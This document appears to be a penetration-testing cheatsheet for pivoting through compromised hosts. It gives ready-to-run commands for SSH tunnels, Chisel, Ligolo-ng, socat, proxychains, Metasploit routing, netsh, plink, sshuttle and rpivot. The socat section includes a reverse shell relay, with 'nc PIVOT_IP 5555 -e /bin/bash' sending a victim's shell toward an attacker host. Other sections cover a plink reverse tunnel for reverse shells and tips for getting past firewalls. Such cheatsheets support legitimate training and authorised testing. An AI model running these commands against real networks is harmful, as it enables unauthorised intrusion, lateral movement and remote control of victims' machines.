# Pivoting Cheatsheet

## Overview

Pivoting allows you to access networks/hosts that are not directly accessible from your attack machine by routing traffic through a compromised host.

---

## SSH Tunneling

### Local Port Forwarding

Access a remote service through a local port.

```bash
# Syntax
ssh -L LOCAL_PORT:TARGET_IP:TARGET_PORT user@PIVOT_HOST

# Example: Access internal web server (192.168.1.100:80) via pivot host
ssh -L 8080:192.168.1.100:80 user@pivot.host

# Now browse http://localhost:8080 to reach 192.168.1.100:80
```

### Remote Port Forwarding

Expose a local service to the pivot network.

```bash
# Syntax
ssh -R REMOTE_PORT:LOCAL_IP:LOCAL_PORT user@PIVOT_HOST

# Example: Expose your web server to pivot network
ssh -R 8080:127.0.0.1:80 user@pivot.host

# Pivot host can now access your web server at localhost:8080
```

### Dynamic Port Forwarding (SOCKS Proxy)

Create a SOCKS proxy for flexible access to the internal network.

```bash
# Create SOCKS proxy
ssh -D 9050 user@pivot.host

# Use with proxychains
# Edit /etc/proxychains4.conf:
# socks5 127.0.0.1 9050

# Then run tools through proxy
proxychains nmap -sT -Pn TARGET
proxychains curl http://internal.host
```

### SSH Tunneling Options

```bash
# Useful flags
-N    # Don't execute remote command (just tunnel)
-f    # Background the connection
-C    # Enable compression
-q    # Quiet mode

# Combined example
ssh -D 9050 -N -f -C user@pivot.host
```

### Double Pivot (SSH over SSH)

```bash
# First hop
ssh -D 9050 -N user@pivot1

# Configure proxychains for first pivot
# Edit /etc/proxychains4.conf: socks5 127.0.0.1 9050

# Second hop through first pivot
proxychains ssh -D 9051 -N user@pivot2

# Configure second proxychains entry
# socks5 127.0.0.1 9051
```

---

## Chisel

### Setup

```bash
# Download from: https://github.com/jpillora/chisel/releases

# On attacker (server mode)
chisel server -p 8080 --reverse

# On pivot host (client mode) - various options below
```

### Reverse SOCKS Proxy

```bash
# On attacker
chisel server -p 8080 --reverse

# On pivot host
chisel client ATTACKER_IP:8080 R:socks

# Use with proxychains (default port 1080)
# Edit /etc/proxychains4.conf:
# socks5 127.0.0.1 1080
```

### Port Forwarding

```bash
# Forward single port
# On attacker
chisel server -p 8080 --reverse

# On pivot (forward internal 192.168.1.100:3389 to attacker:3389)
chisel client ATTACKER_IP:8080 R:3389:192.168.1.100:3389

# Connect to localhost:3389 to reach internal host
```

### Multiple Forwards

```bash
chisel client ATTACKER_IP:8080 R:3389:192.168.1.100:3389 R:445:192.168.1.100:445
```

---

## Ligolo-ng

Modern, efficient tunneling tool.

### Setup

```bash
# Download from: https://github.com/nicocha30/ligolo-ng/releases

# On attacker - create TUN interface
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# Start proxy
./proxy -selfcert

# On pivot host
./agent -connect ATTACKER_IP:11601 -ignore-cert
```

### Usage

```bash
# In proxy interface
session                           # List sessions
session 1                         # Select session
ifconfig                          # Show target interfaces
start                             # Start tunnel

# Add route on attacker for internal network
sudo ip route add 192.168.1.0/24 dev ligolo
```

---

## Socat

### Port Forwarding

```bash
# Forward local port to remote host
socat TCP-LISTEN:8080,fork TCP:TARGET_IP:80

# Example on pivot host - expose internal web server
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80
```

### Reverse Shell Relay

```bash
# On attacker
nc -lvnp 4444

# On pivot host
socat TCP-LISTEN:5555,fork TCP:ATTACKER_IP:4444

# On victim
nc PIVOT_IP 5555 -e /bin/bash
```

### Encrypted Tunnel

```bash
# Generate certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
cat key.pem cert.pem > combined.pem

# On listener
socat OPENSSL-LISTEN:443,cert=combined.pem,verify=0,fork TCP:TARGET:PORT

# On connector
socat TCP-LISTEN:LOCAL_PORT,fork OPENSSL:PIVOT_IP:443,verify=0
```

---

## Proxychains

### Configuration

```bash
# Edit /etc/proxychains4.conf
# 
# Options:
# dynamic_chain - skip dead proxies
# strict_chain  - all proxies must be up
# random_chain  - random proxy order

# Proxy list at bottom of file
socks5 127.0.0.1 1080
socks5 127.0.0.1 9050
```

### Usage

```bash
# Run any tool through proxy
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains curl http://internal.host
proxychains ssh user@internal.host
proxychains evil-winrm -i internal.host -u user -p pass

# Multiple scans
proxychains4 -q nmap -sT -Pn -n -p21,22,80,443 192.168.1.1-254
```

---

## Metasploit Pivoting

### Route Through Session

```bash
# After getting meterpreter session
meterpreter> run autoroute -s 192.168.1.0/24

# Or manually
msf> use post/multi/manage/autoroute
msf> set SESSION 1
msf> set SUBNET 192.168.1.0
msf> run
```

### SOCKS Proxy

```bash
msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 9050
msf> set VERSION 5
msf> run -j

# Use with proxychains
```

### Port Forward

```bash
meterpreter> portfwd add -l LOCAL_PORT -p REMOTE_PORT -r TARGET_IP

# Example
meterpreter> portfwd add -l 3389 -p 3389 -r 192.168.1.100
```

---

## Windows Pivoting

### Netsh Port Forwarding

```cmd
# Add port forward
netsh interface portproxy add v4tov4 listenport=LOCAL_PORT listenaddress=0.0.0.0 connectport=REMOTE_PORT connectaddress=TARGET_IP

# Example
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.100

# List forwards
netsh interface portproxy show all

# Remove forward
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

### Plink (PuTTY Link)

```cmd
# Dynamic port forward (SOCKS)
plink.exe -D 9050 -N user@ATTACKER_IP

# Local port forward
plink.exe -L 8080:192.168.1.100:80 user@ATTACKER_IP

# Remote port forward
plink.exe -R 8080:127.0.0.1:80 user@ATTACKER_IP

# Non-interactive (for reverse shells)
cmd.exe /c echo y | plink.exe -ssh -l user -pw password -R 9050:127.0.0.1:9050 ATTACKER_IP
```

---

## sshuttle

Transparent proxy server that works like a VPN.

```bash
# Install
apt install sshuttle

# Basic usage - proxy entire subnet
sshuttle -r user@pivot.host 192.168.1.0/24

# Multiple subnets
sshuttle -r user@pivot.host 192.168.1.0/24 10.0.0.0/8

# Exclude host
sshuttle -r user@pivot.host 192.168.1.0/24 -x 192.168.1.1

# DNS through tunnel
sshuttle --dns -r user@pivot.host 0/0
```

---

## rpivot

SOCKS4 proxy for penetration testing.

```bash
# On attacker (server)
python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080

# On pivot (client)
python client.py --server-ip ATTACKER_IP --server-port 9999

# Use with proxychains (socks4)
# socks4 127.0.0.1 1080
```

---

## Scenario Examples

### Scenario 1: Single Pivot

```
Attacker (10.10.14.5) --> Pivot (10.10.10.5 | 192.168.1.5) --> Target (192.168.1.100)

# Method 1: SSH Dynamic
ssh -D 9050 -N user@10.10.10.5
proxychains nmap -sT -Pn 192.168.1.100

# Method 2: Chisel
# On attacker
chisel server -p 8080 --reverse

# On pivot
chisel client 10.10.14.5:8080 R:socks

proxychains nmap -sT -Pn 192.168.1.100
```

### Scenario 2: Double Pivot

```
Attacker --> Pivot1 --> Pivot2 --> Target

# SSH Method
ssh -D 9050 -N user@pivot1
# Configure proxychains: socks5 127.0.0.1 9050

proxychains ssh -D 9051 -N user@pivot2
# Add to proxychains: socks5 127.0.0.1 9051

proxychains nmap -sT -Pn target

# Chisel Method
# On attacker
chisel server -p 8080 --reverse

# On pivot1
chisel client ATTACKER:8080 R:1080:socks

# On pivot2 (through pivot1)
proxychains chisel client ATTACKER:8080 R:1081:socks
```

---

## Quick Reference

| Tool | Use Case | Command |
|------|----------|---------|
| SSH -L | Access remote port locally | `ssh -L 8080:target:80 pivot` |
| SSH -D | SOCKS proxy | `ssh -D 9050 pivot` |
| Chisel | SOCKS proxy (no SSH) | `chisel client host:port R:socks` |
| Socat | Simple port forward | `socat TCP-LISTEN:80,fork TCP:target:80` |
| Proxychains | Route tools through proxy | `proxychains nmap target` |
| Ligolo-ng | Full VPN-like tunnel | `./proxy` / `./agent` |
| sshuttle | VPN over SSH | `sshuttle -r pivot subnet` |

---

## Tips

### Scanning Through Proxies

```bash
# TCP connect scan only (no SYN scan)
proxychains nmap -sT -Pn -n TARGET

# Faster scanning
proxychains nmap -sT -Pn -n --top-ports 100 TARGET

# Use TCP wrappers for UDP
```

### Stability

```bash
# Keep SSH tunnels alive
ssh -o ServerAliveInterval=60 -D 9050 user@pivot

# Autossh for persistent tunnels
autossh -M 0 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" -D 9050 user@pivot
```

### Firewall Bypass

```bash
# Use common ports (80, 443, 53)
ssh -D 9050 -p 443 user@pivot
chisel server -p 443 --reverse
```



